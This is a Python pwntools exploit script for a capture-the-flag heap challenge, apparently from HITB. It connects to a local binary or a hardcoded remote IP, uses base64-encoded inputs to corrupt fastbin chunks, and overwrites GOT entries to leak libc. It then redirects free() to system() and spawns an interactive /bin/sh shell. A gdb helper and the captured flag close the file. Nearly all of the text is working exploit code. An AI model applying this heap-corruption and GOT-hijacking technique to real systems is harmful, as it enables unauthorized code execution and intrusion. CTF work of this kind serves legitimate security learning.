from pwn import *
import time
import sys
from base64 import b64encode, b64decode

def d(DEBUG):
	t = 0.5
	if DEBUG=="1":
		offset_libc_start_main = 0x20740
		offset_system = 0x45390
		offset_sh = 0x18cd57
		r = process("./d")
		raw_input("debug?")
	elif DEBUG=="2":
		offset_libc_start_main = 0x20740
		offset_system = 0x45390
		offset_sh = 0x18cd57
		t = 0.03
		HOST = '47.75.154.113'
		PORT = 9999
		r = remote(HOST,PORT)
	
	def Read(idx, msg):
		r.sendline("1")
		r.recvuntil("Which? :")
		r.sendline(str(idx))
		r.recvuntil("msg:")
		if len(msg)==0x400:
			r.send(msg)
			time.sleep(t)
		else:
			r.sendline(msg)
		return r.recvuntil("Which? :")
	
	def Edit(idx, msg):
		r.sendline("2")
		r.recvuntil("Which? :")
		r.sendline(str(idx))
		r.recvuntil("new msg:")
		if len(msg)==0x400:
			r.send(msg)
			time.sleep(t)
		else:
			r.sendline(msg)
		return r.recvuntil("Which? :")
	
	def Wipe(idx):
		r.sendline("3")
		r.recvuntil("Which? :")
		r.sendline(str(idx))
		return r.recvuntil("Which? :")
	
	
	r.recvuntil("Which? :")
	addr = 0x60217d-0x10
	LIST_ADDR = 0x602180
	free_got = 0x602018
	printf_got = 0x602038
	strlen_got = 0x602028
	atoi_got = 0x602068
	atoi_plt = 0x400800
	libc_start_main_got = 0x602050
	puts_plt = 0x400770
	dl_resolve_got = 0x602010
	Read(0, b64encode("a"*0x20))

	Read(1, b64encode("a"*0x20))

	Read(2, b64encode("a"*0x60))

	Read(3, b64encode("a"*0x60))

	Wipe(0)

	Read(0, b64encode("\x60"*0x29)[:-1])

	payload = "a"*0x28
	payload += p64(0x71)
	Edit(2, payload)
	Wipe(1)
	Wipe(2)

	Read(1, b64encode("a"*0x50))

	payload = p64(0)*5
	payload += p64(0x71)
	payload += p64(addr)
	Edit(1, payload)

	Read(2, b64encode("a"*0x60))
	
	payload = "a"*3
	payload += "A"*(0x50-len(payload))
		
	Read(4, b64encode(payload))
	
	payload = "0"*3
	payload += p64(LIST_ADDR) # 0
	payload += p64(free_got) # 1
	payload += p64(strlen_got) # 2
	payload += p64(atoi_got) # 3
	payload += p64(dl_resolve_got) # 4
	payload += p64(libc_start_main_got) # 5
	payload = payload.ljust(0x65,"\x00")
	Read(5, b64encode(payload))
	
	payload = p64(puts_plt)[:5]
	Edit(1, payload)
	
	res = Wipe(5)
	libc_start_main = u64(res[:6].ljust(8,"\x00"))
	log.info("libc_start_main: %#x" % libc_start_main)
	baselibc = libc_start_main - offset_libc_start_main
	system = baselibc + offset_system
	sh = baselibc + offset_sh
	
	log.info("baselibc: %#x" % baselibc)
	log.info("system: %#x" % system)
	log.info("sh: %#x" % sh)
	
	payload = "/bin/sh\x00"
	Read(6, b64encode(payload))
	
	Edit(4, p64(0x31313131)) # dl_resolve_got = "1111"
	
	payload = p64(atoi_plt) # strlen_got = atoi_plt
	Edit(2, payload)
	
	raw_input("?")
	msg = "A"*8
	msg += p64(system)[:-1]
	Edit(4, msg)
	
	r.sendline("3") # Wipe
	r.sendline("6") # idx sh
	# free(sh) => system(sh)
	r.interactive()

d(sys.argv[1])
"""
define ff
telescope 0x602180 64
x/40gx *0x602180-0x10
fastbins
end
"""
# HITB{b4se364_1s_th3_b3st_3nc0d1ng!}